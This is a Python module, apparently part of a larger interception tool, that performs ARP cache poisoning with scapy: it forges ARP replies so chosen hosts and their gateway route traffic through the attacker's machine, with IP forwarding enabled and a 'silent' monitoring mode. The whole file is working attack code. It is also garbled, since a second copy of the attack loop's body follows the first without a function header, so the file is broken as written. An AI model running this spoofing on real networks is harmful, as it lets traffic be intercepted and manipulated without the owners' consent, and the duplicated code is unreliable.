import time
import scapy.all as scapy
from . import STATUS, STOP_EVENT
from .utils import log_msg, set_ip_forwarding, set_port_forwarding, get_mac

# Helper Functions
def get_own_mac(interface):
    try: 
        return scapy.get_if_hwaddr(interface)
    except: 
        return None

# ARP Spoofing Core Functions
def spoof(target_ip, spoof_ip, target_mac, attacker_mac):
    # Standard Spoofing packet
    packet = scapy.Ether(dst=target_mac, src=attacker_mac) / \
             scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    scapy.sendp(packet, verbose=False, iface=STATUS["interface"])

def restore(dest_ip, source_ip, dest_mac):
    source_mac = get_mac(source_ip)
    # If source (Gateway) is dead/fake, we can't find its real MAC to restore it perfectly.
    # But we can try to broadcast or just skip if source_mac is None.
    if dest_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False, iface=STATUS["interface"])
        
# --- UPDATED FOR MULTI-TARGET ---
def run_attack_loop(target_ips, gateway_ip, passive=False):
    STATUS["state"] = "RUNNING"
    STATUS["packets"] = 0
    set_ip_forwarding(1)
    
    active_targets = [] 

    try:
        attacker_mac = get_own_mac(STATUS["interface"])
        
        # 1. Try to resolve Gateway MAC
        mitm_mac = get_mac(gateway_ip)
        
        if not mitm_mac:
            # CHANGE: Don't stop. Just warn and enable One-Way Spoofing.
            log_msg(f"[!] WARNING: Gateway {gateway_ip} is offline or unreachable.")
            log_msg(f"[*] Switching to ONE-WAY SPOOFING (Target -> Attacker only)")
        
        # 2. Resolve Targets
        log_msg(f"[*] Resolving MAC addresses for {len(target_ips)} targets...")
        for t_ip in target_ips:
            t_mac = get_mac(t_ip)
            if t_mac:
                active_targets.append({"ip": t_ip, "mac": t_mac})
                log_msg(f"    + Target Locked: {t_ip} [{t_mac}]")
            else:
                log_msg(f"    - Failed to resolve: {t_ip}")

        STATUS["active_targets"] = active_targets

        if not active_targets:
            log_msg("[!] No valid targets found. Stopping.")
            return


        if passive:
            log_msg(f"[*] SILENT MODE: Monitoring {len(active_targets)} hosts")
        else:
            log_msg(f"[*] ATTACK ACTIVE: Poisoning started...")

        while not STOP_EVENT.is_set():
            if not passive:
                for target in active_targets:
                    # SPOOF SIDE 1: Tell Target that I am the Gateway
                    # (This works even if Gateway is offline)
                    spoof(target["ip"], gateway_ip, target["mac"], attacker_mac)
                    
                    # SPOOF SIDE 2: Tell Gateway that I am the Target
                    # (Only do this if Gateway is actually online)
                    if mitm_mac:
                        spoof(gateway_ip, target["ip"], mitm_mac, attacker_mac)
                
                # Count packets appropriately
                multiplier = 2 if mitm_mac else 1
                STATUS["packets"] += (len(active_targets) * multiplier)
            
            time.sleep(2)
            
    except Exception as e: log_msg(f"[!] ARP ERROR: {e}")
    finally:
        # --- SILENT CLEANUP LOGIC ---
        # Only log "Stopped" if we actually sent packets or ran for a while.
        # If packets == 0 and STOP_EVENT is set, it was a "Ghost Run" -> Stay Silent.
        is_ghost = STOP_EVENT.is_set() and STATUS["packets"] == 0

        if not is_ghost:
            if not passive:
                log_msg("[-] ATTACK STOPPED: Restoring network...")
            else:
                log_msg("[-] STOPPED: Silent Monitor disabled")

        # Always restore network to be safe, but do it silently if ghost
        for target in active_targets:
            try:
                restore(target["ip"], gateway_ip, target["mac"])
                if mitm_mac: restore(gateway_ip, target["ip"], mitm_mac)
            except: pass

        set_ip_forwarding(0)
        set_port_forwarding(False)
        STATUS["state"] = "IDLE"
        STATUS["mode"] = "NONE"
    """
    target_ips: list of IP strings ['192.168.1.5', '192.168.1.9']
    """
    STATUS["state"] = "RUNNING"
    STATUS["packets"] = 0
    set_ip_forwarding(1)
    
    # Store targets and their MACs
    active_targets = [] 

    try:
        attacker_mac = get_own_mac(STATUS["interface"])
        mitm_mac = get_mac(gateway_ip)

        if not mitm_mac:
            log_msg(f"[!] WARNING: Gateway {gateway_ip} is offline.")
            log_msg(f"[*] Switching to ONE-WAY SPOOFING (Target -> Attacker)")

        # 1. Resolve MACs for ALL targets
        log_msg(f"[*] Resolving MAC addresses for {len(target_ips)} targets...")
        
        for t_ip in target_ips:
            t_mac = get_mac(t_ip)
            if t_mac:
                active_targets.append({"ip": t_ip, "mac": t_mac})
                log_msg(f"    + Target Locked: {t_ip} [{t_mac}]")
            else:
                log_msg(f"    - Failed to resolve: {t_ip}")

        STATUS["active_targets"] = active_targets # Update Global Status for UI if needed

        if not active_targets:
            log_msg("[!] No valid targets found. Stopping.")
            return

        if passive:
            log_msg(f"[*] SILENT MODE: Monitoring {len(active_targets)} hosts")
        else:
            log_msg(f"[*] ATTACK ACTIVE: Poisoning {len(active_targets)} hosts")

        while not STOP_EVENT.is_set():
            # Only send packets if NOT passive
            if not passive:
                for target in active_targets:
                    # 1. Tell Target that I am the Gateway
                    spoof(target["ip"], gateway_ip, target["mac"], attacker_mac)
                    
                    # 2. Tell Gateway that I am the Target
                    spoof(gateway_ip, target["ip"], mitm_mac, attacker_mac)
                
                STATUS["packets"] += (len(active_targets) * 2)
            
            # Sleep slightly to prevent network flooding (2s is good)
            time.sleep(2)
            
    except Exception as e: log_msg(f"[!] ARP ERROR: {e}")
    finally:
        if not passive:
            log_msg("[-] ATTACK STOPPED: Restoring network...")
            # Restore ALL targets
            for target in active_targets:
                restore(target["ip"], gateway_ip, target["mac"])
                restore(gateway_ip, target["ip"], mitm_mac)
        else:
            log_msg("[-] STOPPED: Silent Monitor disabled")
            
        set_ip_forwarding(0)
        set_port_forwarding(False)
        STATUS["state"] = "IDLE"
        STATUS["mode"] = "NONE"